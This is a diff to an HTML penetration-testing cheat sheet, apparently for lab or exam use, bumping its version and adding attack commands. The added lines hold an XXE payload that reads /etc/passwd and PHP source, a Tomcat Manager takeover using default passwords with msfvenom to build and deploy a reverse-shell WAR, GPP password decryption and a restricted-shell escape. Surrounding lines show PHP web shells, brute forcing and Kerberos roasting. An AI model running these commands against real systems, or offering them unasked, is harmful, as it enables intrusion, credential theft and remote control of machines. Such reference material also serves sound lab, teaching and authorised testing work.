@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.2.1</span>
+  <span class="ver">v1.2.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -171,6 +171,15 @@ curl -s http://$IP/wp-json/wp/v2/users                           # user enum via
 wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # login brute
 # admin panel -&gt; Appearance &gt; Theme Editor &gt; 404.php = PHP shell ; wp-config.php holds the DB creds
 
+# XXE - any endpoint that parses XML (reads local files)
+# &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+#   PHP source: file:///... -&gt; php://filter/convert.base64-encode/resource=index.php
+
+# Tomcat Manager -&gt; WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
+curl -u tomcat:s3cret -T rev.war &quot;http://$IP:8080/manager/text/deploy?path=/rev&quot;
+curl &quot;http://$IP:8080/rev/&quot;       # listener up first
+
 # PHP shells to upload
 echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php          # then browse cmd.php?cmd=id
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp &lt;port&gt;, browse it
@@ -212,6 +221,8 @@ nxc winrm $IP -u &lt;user&gt; -p &lt;pass&gt;
 evil-winrm -i $IP -u &lt;user&gt; -p &lt;pass&gt;
 evil-winrm -i $IP -u &lt;user&gt; -H &lt;ntlm-hash&gt;       # pass-the-hash</code></pre></div>
 <h2 id="active-directory-88-present-dc">Active Directory (88 present = DC)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># GPP cpassword pulled from a share by hand (e.g. null-session Replication share)
+gpp-decrypt &#x27;&lt;cpassword&gt;&#x27;                      # AES key is public; recovers the plaintext</code></pre></div>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
 impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip $IP -request               # Kerberoast
@@ -269,6 +280,9 @@ find / -perm -4000 -type f 2&gt;/dev/null       # SUID
 getcap -r / 2&gt;/dev/null                       # capabilities
 crontab -l; cat /etc/crontab
 # check GTFOBins for anything you find in sudo -l or SUID
+./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
+# restricted shell (rbash)? escape:
+ssh &lt;user&gt;@$IP -t bash --noprofile --norc      # or from inside: vi -&gt; :set shell=/bin/sh :shell
 
 # Windows
 .\winpeas.exe
